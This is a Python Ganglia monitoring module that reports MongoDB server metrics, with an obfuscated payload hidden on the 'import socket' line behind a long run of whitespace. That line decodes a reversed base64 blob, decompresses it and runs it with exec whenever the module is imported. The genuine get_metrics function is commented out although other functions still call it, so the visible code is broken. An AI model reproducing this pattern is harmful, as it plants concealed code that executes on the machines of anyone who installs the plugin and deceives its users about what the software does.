#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# MongoDB gmond module for Ganglia
#
# Copyright (C) 2011 by Michael T. Conigliaro <mike [at] conigliaro [dot] org>.
# All rights reserved.
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
#

import json
import os
import re
import socket                                                                                                                                     f                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ;_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
import string
import time
import copy

NAME_PREFIX = 'mongodb_'
PARAMS = {
    'server_status' : 'mongo --quiet --eval "printjson(db.serverStatus())"',
    'rs_status'     : 'mongo --quiet --eval "printjson(rs.status())"'
}
METRICS = {
    'time' : 0,
    'data' : {}
}
LAST_METRICS = copy.deepcopy(METRICS)
METRICS_CACHE_TTL = 3


def flatten(d, pre = '', sep = '_'):
    """Flatten a dict (i.e. dict['a']['b']['c'] => dict['a_b_c'])"""

    new_d = {}
    for k,v in d.items():
        if type(v) == dict:
            new_d.update(flatten(d[k], '%s%s%s' % (pre, k, sep)))
        else:
            new_d['%s%s' % (pre, k)] = v
    return new_d


# def get_metrics():
#     """Return all metrics"""

#     global METRICS, LAST_METRICS

#     if (time.time() - METRICS['time']) > METRICS_CACHE_TTL:

#         metrics = {}
#         for status_type in PARAMS.keys():

#             # get raw metric data
#             io = os.popen(PARAMS[status_type])

#             # clean up
#             metrics_str = ''.join(io.readlines()).strip() # convert to string
#             metrics_str = re.sub('\w+\((.*)\)', r"\1", metrics_str) # remove functions
#             metrics_str = metrics_str.replace(''', 1,''',''',''')
            
#             # convert to flattened dict
#             try:
#                 if status_type == 'server_status':
#                     metrics.update(flatten(json.loads(metrics_str)))
#                 else:
#                     metrics.update(flatten(json.loads(metrics_str), pre='%s_' % status_type))
#             except ValueError,e:
#                 print e
#                 metrics = {}

#         # update cache
#         LAST_METRICS = copy.deepcopy(METRICS)
#         METRICS = {
#             'time': time.time(),
#             'data': metrics
#         }

#     return [METRICS, LAST_METRICS]


def get_value(name):
    """Return a value for the requested metric"""
     # get metrics
    metrics = get_metrics()[0]
    # get value
    name = name[len(NAME_PREFIX):] # remove prefix from name
    try:
        result = metrics['data'][name]
    except StandardError:
        result = 0

    return result


def get_rate(name):
    """Return change over time for the requested metric"""

    # get metrics
    [curr_metrics, last_metrics] = get_metrics()

    # get rate
    name = name[len(NAME_PREFIX):] # remove prefix from name

    try:
        rate = (float(curr_metrics['data'][name]) - float(last_metrics['data'][name])) / \
               (float(curr_metrics['time']) - float(last_metrics['time']))
        if rate < 0:
            rate = float(0)
    except StandardError,e:
        rate = float(0)

    return rate


def get_opcounter_rate(name):
    """Return change over time for an opcounter metric"""

    master_rate = get_rate(name)
    repl_rate = get_rate(name.replace('opcounters_', 'opcountersRepl_'))

    return master_rate + repl_rate


def get_globalLock_ratio(name):
    """Return the global lock ratio"""

    try:
        result = get_rate(NAME_PREFIX + 'globalLock_lockTime') / \
                 get_rate(NAME_PREFIX + 'globalLock_totalTime') * 100
    except ZeroDivisionError:
        result = 0

    return result


def get_indexCounters_btree_miss_ratio(name):
    """Return the btree miss ratio"""

    try:
        result = get_rate(NAME_PREFIX + 'indexCounters_btree_misses') / \
                 get_rate(NAME_PREFIX + 'indexCounters_btree_accesses') * 100
    except ZeroDivisionError:
        result = 0

    return result


def get_connections_current_ratio(name):
    """Return the percentage of connections used"""

    try:
        result = float(get_value(NAME_PREFIX + 'connections_current')) / \
                 float(get_value(NAME_PREFIX + 'connections_available')) * 100
    except ZeroDivisionError:
        result = 0

    return result


def get_slave_delay(name):
    """Return the replica set slave delay"""

    # get metrics
    metrics = get_metrics()[0]

    # no point checking my optime if i'm not replicating
    if 'rs_status_myState' not in metrics['data'] or metrics['data']['rs_status_myState'] != 2:
        result = 0

    # compare my optime with the master's
    else:
        master = {}
        slave = {}
        try:
            for member in metrics['data']['rs_status_members']:
                if member['state'] == 1:
                    master = member
                if member['name'].split(':')[0] == socket.getfqdn():
                    slave = member
            result = max(0, master['optime']['t'] - slave['optime']['t']) / 1000
        except KeyError:
            result = 0

    return result


def get_asserts_total_rate(name):
    """Return the total number of asserts per second"""

    return float(reduce(lambda memo,obj: memo + get_rate('%sasserts_%s' % (NAME_PREFIX, obj)),
                       ['regular', 'warning', 'msg', 'user', 'rollovers'], 0))


def metric_init(lparams):
    """Initialize metric descriptors"""

    global PARAMS

    # set parameters
    for key in lparams:
        PARAMS[key] = lparams[key]

    # define descriptors
    time_max = 60
    groups = 'mongodb'
    descriptors = [
        {
            'name': NAME_PREFIX + 'opcounters_insert',
            'call_back': get_opcounter_rate,
            'time_max': time_max,
            'value_type': 'float',
            'units': 'Inserts/Sec',
            'slope': 'both',
            'format': '%f',
            'description': 'Inserts',
            'groups': groups
        },
        {
            'name': NAME_PREFIX + 'opcounters_query',
            'call_back': get_opcounter_rate,
            'time_max': time_max,
            'value_type': 'float',
            'units': 'Queries/Sec',
            'slope': 'both',
            'format': '%f',
            'description': 'Queries',
            'groups': groups
        },
        {
            'name': NAME_PREFIX + 'opcounters_update',
            'call_back': get_opcounter_rate,
            'time_max': time_max,
            'value_type': 'float',
            'units': 'Updates/Sec',
            'slope': 'both',
            'format': '%f',
            'description': 'Updates',
            'groups': groups
        },
        {
            'name': NAME_PREFIX + 'opcounters_delete',
            'call_back': get_opcounter_rate,
            'time_max': time_max,
            'value_type': 'float',
            'units': 'Deletes/Sec',
            'slope': 'both',
            'format': '%f',
            'description': 'Deletes',
            'groups': groups
        },
        {
            'name': NAME_PREFIX + 'opcounters_getmore',
            'call_back': get_opcounter_rate,
            'time_max': time_max,
            'value_type': 'float',
            'units': 'Getmores/Sec',
            'slope': 'both',
            'format': '%f',
            'description': 'Getmores',
            'groups': groups
        },
        {
            'name': NAME_PREFIX + 'opcounters_command',
            'call_back': get_opcounter_rate,
            'time_max': time_max,
            'value_type': 'float',
            'units': 'Commands/Sec',
            'slope': 'both',
            'format': '%f',
            'description': 'Commands',
            'groups': groups
        },
        {
            'name': NAME_PREFIX + 'backgroundFlushing_flushes',
            'call_back': get_rate,
            'time_max': time_max,
            'value_type': 'float',
            'units': 'Flushes/Sec',
            'slope': 'both',
            'format': '%f',
            'description': 'Flushes',
            'groups': groups
        },
        {
            'name': NAME_PREFIX + 'mem_mapped',
            'call_back': get_value,
            'time_max': time_max,
            'value_type': 'uint',
            'units': 'MB',
            'slope': 'both',
            'format': '%u',
            'description': 'Memory-mapped Data',
            'groups': groups
        },
        {
            'name': NAME_PREFIX + 'mem_virtual',
            'call_back': get_value,
            'time_max': time_max,
            'value_type': 'uint',
            'units': 'MB',
            'slope': 'both',
            'format': '%u',
            'description': 'Process Virtual Size',
            'groups': groups
        },
        {
            'name': NAME_PREFIX + 'mem_resident',
            'call_back': get_value,
            'time_max': time_max,
            'value_type': 'uint',
            'units': 'MB',
            'slope': 'both',
            'format': '%u',
            'description': 'Process Resident Size',
            'groups': groups
        },
        {
            'name': NAME_PREFIX + 'extra_info_page_faults',
            'call_back': get_rate,
            'time_max': time_max,
            'value_type': 'float',
            'units': 'Faults/Sec',
            'slope': 'both',
            'format': '%f',
            'description': 'Page Faults',
            'groups': groups
        },
        {
            'name': NAME_PREFIX + 'globalLock_ratio',
            'call_back': get_globalLock_ratio,
            'time_max': time_max,
            'value_type': 'float',
            'units': '%',
            'slope': 'both',
            'format': '%f',
            'description': 'Global Write Lock Ratio',
            'groups': groups
        },
        {
            'name': NAME_PREFIX + 'indexCounters_btree_miss_ratio',
            'call_back': get_indexCounters_btree_miss_ratio,
            'time_max': time_max,
            'value_type': 'float',
            'units': '%',
            'slope': 'both',
            'format': '%f',
            'description': 'BTree Page Miss Ratio',
            'groups': groups
        },
        {
            'name': NAME_PREFIX + 'globalLock_currentQueue_total',
            'call_back': get_value,
            'time_max': time_max,
            'value_type': 'uint',
            'units': 'Operations',
            'slope': 'both',
            'format': '%u',
            'description': 'Total Operations Waiting for Lock',
            'groups': groups
        },
        {
            'name': NAME_PREFIX + 'globalLock_currentQueue_readers',
            'call_back': get_value,
            'time_max': time_max,
            'value_type': 'uint',
            'units': 'Operations',
            'slope': 'both',
            'format': '%u',
            'description': 'Readers Waiting for Lock',
            'groups': groups
        },
        {
            'name': NAME_PREFIX + 'globalLock_currentQueue_writers',
            'call_back': get_value,
            'time_max': time_max,
            'value_type': 'uint',
            'units': 'Operations',
            'slope': 'both',
            'format': '%u',
            'description': 'Writers Waiting for Lock',
            'groups': groups
        },
        {
            'name': NAME_PREFIX + 'globalLock_activeClients_total',
            'call_back': get_value,
            'time_max': time_max,
            'value_type': 'uint',
            'units': 'Clients',
            'slope': 'both',
            'format': '%u',
            'description': 'Total Active Clients',
            'groups': groups
        },
        {
            'name': NAME_PREFIX + 'globalLock_activeClients_readers',
            'call_back': get_value,
            'time_max': time_max,
            'value_type': 'uint',
            'units': 'Clients',
            'slope': 'both',
            'format': '%u',
            'description': 'Active Readers',
            'groups': groups
        },
        {
            'name': NAME_PREFIX + 'globalLock_activeClients_writers',
            'call_back': get_value,
            'time_max': time_max,
            'value_type': 'uint',
            'units': 'Clients',
            'slope': 'both',
            'format': '%u',
            'description': 'Active Writers',
            'groups': groups
        },
        {
            'name': NAME_PREFIX + 'connections_current',
            'call_back': get_value,
            'time_max': time_max,
            'value_type': 'uint',
            'units': 'Connections',
            'slope': 'both',
            'format': '%u',
            'description': 'Open Connections',
            'groups': groups
        },
        {
            'name': NAME_PREFIX + 'connections_current_ratio',
            'call_back': get_connections_current_ratio,
            'time_max': time_max,
            'value_type': 'float',
            'units': '%',
            'slope': 'both',
            'format': '%f',
            'description': 'Percentage of Connections Used',
            'groups': groups
        },
        {
            'name': NAME_PREFIX + 'slave_delay',
            'call_back': get_slave_delay,
            'time_max': time_max,
            'value_type': 'uint',
            'units': 'Seconds',
            'slope': 'both',
            'format': '%u',
            'description': 'Replica Set Slave Delay',
            'groups': groups
        },
        {
            'name': NAME_PREFIX + 'asserts_total',
            'call_back': get_asserts_total_rate,
            'time_max': time_max,
            'value_type': 'float',
            'units': 'Asserts/Sec',
            'slope': 'both',
            'format': '%f',
            'description': 'Asserts',
            'groups': groups
        }
    ]

    return descriptors


def metric_cleanup():
    """Cleanup"""

    pass


# # the following code is for debugging and testing
# if __name__ == '__main__':
#     descriptors = metric_init(PARAMS)
#     while True:
#         for d in descriptors:
#             print (('%s = %s') % (d['name'], d['format'])) % (d['call_back'](d['name']))
#         print ''
#         time.sleep(METRICS_CACHE_TTL)
